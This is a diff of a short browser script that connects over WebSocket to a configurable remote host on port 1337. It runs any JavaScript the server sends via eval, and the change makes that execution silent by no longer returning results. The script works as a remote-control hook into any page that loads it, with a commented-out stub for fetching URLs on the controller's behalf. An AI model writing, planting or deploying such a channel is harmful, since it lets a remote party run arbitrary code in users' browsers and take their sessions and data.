@@ -11,31 +11,25 @@ if (host_port) {
 } else {
 	host_port='1337'
 }
-
 var socket;
-
 function send(obj){
 	socket.send(JSON.stringify(obj));
 }
-
 function connect(){
 socket = new WebSocket('ws://'+host_addr+':'+host_port);
 socket.onopen = function () {
 	socket.send('hello from the client');
 };
-
 function handleObj(obj)
 {
 	if (obj.request == 'eval') {
-		send({data:eval(obj.content)});
+		eval(obj.content);
 	} else if (obj.request == 'get') {
 		//$.ajax({url: obj.url})
 		//.done(function(h) { socket.send(JSON.stringify({'request': 'getresponse', 'html': h})); console.log(h); });
 	}
 }
-
 socket.onmessage = function (message) {
-	//content.innerHTML += message.data +'<br />';
 	try { obj = JSON.parse(message.data); } catch(e) { }
 	if (typeof(obj) === 'object')
 		handleObj(obj);
@@ -59,6 +53,4 @@ function updateConnectionStatus() {
 	connect()
 }
 connection.addEventListener('typechange', updateConnectionStatus);
-
 </script>
-
